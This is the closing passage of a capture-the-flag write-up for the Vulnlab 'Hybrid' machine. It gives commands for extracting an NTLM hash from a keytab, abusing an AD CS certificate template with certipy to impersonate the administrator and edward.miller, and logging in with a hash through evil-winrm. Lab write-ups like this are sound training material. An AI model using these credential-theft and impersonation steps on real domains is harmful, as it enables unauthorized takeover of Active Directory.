+<p><img src="/images/Hybrid/esc1.png" alt="ESC1 Exploitation"></p>
+<h3 id="Machine-Account-Exploitation"><a href="#Machine-Account-Exploitation" class="headerlink" title="Machine Account Exploitation"></a>Machine Account Exploitation</h3><p>Used KeyTabExtract to obtain NTLM hash:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 keytabextraction.py krb5.keytab</span><br></pre></td></tr></table></figure>
+
+<p>Certificate Request:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">certipy req -u &#x27;MAIL01$&#x27;@hybrid.vl -hashes &#x27;&lt;HASH&gt;&#x27; -ca &#x27;hybrid-DC01-CA&#x27; -template HybridComputers -dc-ip 10.10.210.149 -upn &#x27;administrator@hybrid.vl&#x27; -dns dc01.hybrid.vl -key-size 4096 -debug</span><br></pre></td></tr></table></figure>
+
+<h3 id="Final-Domain-Admin-Acquisition"><a href="#Final-Domain-Admin-Acquisition" class="headerlink" title="Final Domain Admin Acquisition"></a>Final Domain Admin Acquisition</h3><p>Targeted <code>edward.miller</code>:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">certipy req -u &#x27;MAIL01$&#x27;@hybrid.vl -hashes &#x27;&lt;HASH&gt;&#x27; -ca &#x27;hybrid-DC01-CA&#x27; -template HybridComputers -dc-ip 10.10.210.149 -upn &#x27;edward.miller@hybrid.vl&#x27; -key-size 5000 -debug</span><br></pre></td></tr></table></figure>
+
+<p>WinRM Access:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">evil-winrm -i 10.10.210.149 -u edward.miller -H &#x27;&lt;HASH&gt;&#x27;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/Hybrid/gotdomain.png" alt="Domain Admin Access"></p>
+<p><a target="_blank" rel="noopener" href="https://api.vulnlab.com/api/v1/share?id=3699f13c-1071-42b6-a209-7417a77b9d86" title="https://api.vulnlab.com/api/v1/share?id=3699f13c-1071-42b6-a209-7417a77b9d86">https://api.vulnlab.com/api/v1/share?id=3699f13c-1071-42b6-a209-7417a77b9d86</a></p>
+
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+        
+          <li><a href="/">Home</a></li>
+        
+          <li><a href="/about/">About</a></li>
+        
+          <li><a href="/archives/">Writeups</a></li>
+        
+          <li><a href="/search/">Search</a></li>
+        
+          <li><a href="/tags/">Tags</a></li>
+        
+          <li><a target="_blank" rel="noopener" href="https://github.com/PanosoikoGr">Projects</a></li>
+        
+      </ul>
+    </div>
+
+    
+    
+      <div id="toc-footer" style="display: none">
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Initial-Reconnaissance"><span class="toc-number">1.</span> <span class="toc-text">Initial Reconnaissance</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#mail01-hybrid-vl"><span class="toc-number">1.1.</span> <span class="toc-text">mail01.hybrid.vl</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#SMTP-Exploration"><span class="toc-number">2.</span> <span class="toc-text">SMTP Exploration</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Roundcube-Webmail-Analysis"><span class="toc-number">2.1.</span> <span class="toc-text">Roundcube Webmail Analysis</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#NFS-Exploration"><span class="toc-number">3.</span> <span class="toc-text">NFS Exploration</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Credential-Discovery"><span class="toc-number">3.1.</span> <span class="toc-text">Credential Discovery</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Exploitation-Strategy"><span class="toc-number">4.</span> <span class="toc-text">Exploitation Strategy</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Privilege-Escalation"><span class="toc-number">4.1.</span> <span class="toc-text">Privilege Escalation</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Advanced-NFS-User-Context-Exploitation"><span class="toc-number">4.1.1.</span> <span class="toc-text">Advanced NFS User Context Exploitation</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#Initial-User-Reconnaissance"><span class="toc-number">4.1.1.1.</span> <span class="toc-text">Initial User Reconnaissance</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#Exploitation-Methodology"><span class="toc-number">4.1.1.2.</span> <span class="toc-text">Exploitation Methodology</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#Detailed-Exploitation-Steps"><span class="toc-number">4.1.1.3.</span> <span class="toc-text">Detailed Exploitation Steps</span></a></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#dc01-hybrid-vl"><span class="toc-number">4.2.</span> <span class="toc-text">dc01.hybrid.vl</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ADCS-Active-Directory-Certificate-Services-Exploitation"><span class="toc-number">5.</span> <span class="toc-text">ADCS (Active Directory Certificate Services) Exploitation</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Initial-Reconnaissance-1"><span class="toc-number">5.1.</span> <span class="toc-text">Initial Reconnaissance</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Machine-Account-Exploitation"><span class="toc-number">5.2.</span> <span class="toc-text">Machine Account Exploitation</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Final-Domain-Admin-Acquisition"><span class="toc-number">5.3.</span> <span class="toc-text">Final Domain Admin Acquisition</span></a></li></ol></li></ol>
+      </div>
+    
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://panosoikogr.github.io/2025/03/28/VL-Hybrid/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://panosoikogr.github.io/2025/03/28/VL-Hybrid/&text=VL-Hybrid"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://panosoikogr.github.io/2025/03/28/VL-Hybrid/&title=VL-Hybrid"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://panosoikogr.github.io/2025/03/28/VL-Hybrid/&is_video=false&description=VL-Hybrid"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=VL-Hybrid&body=Check out this article: https://panosoikogr.github.io/2025/03/28/VL-Hybrid/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://panosoikogr.github.io/2025/03/28/VL-Hybrid/&title=VL-Hybrid"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://panosoikogr.github.io/2025/03/28/VL-Hybrid/&title=VL-Hybrid"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://panosoikogr.github.io/2025/03/28/VL-Hybrid/&title=VL-Hybrid"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://panosoikogr.github.io/2025/03/28/VL-Hybrid/&title=VL-Hybrid"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://panosoikogr.github.io/2025/03/28/VL-Hybrid/&name=VL-Hybrid&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://panosoikogr.github.io/2025/03/28/VL-Hybrid/&t=VL-Hybrid"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+        
+          <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2016-2025
+    Panosoiko
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writeups</a></li><!--
+     --><!--
+       --><li><a href="/search/">Search</a></li><!--
+     --><!--
+       --><li><a href="/tags/">Tags</a></li><!--
+     --><!--
+       --><li><a target="_blank" rel="noopener" href="https://github.com/PanosoikoGr">Projects</a></li><!--
+     -->
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
+    btn += '<i class="fa-regular fa-clone"></i>';
+    btn += '</span>';
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "Copied!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Disqus Comments -->
+
+<!-- utterances Comments -->
+
+</body>
+</html>
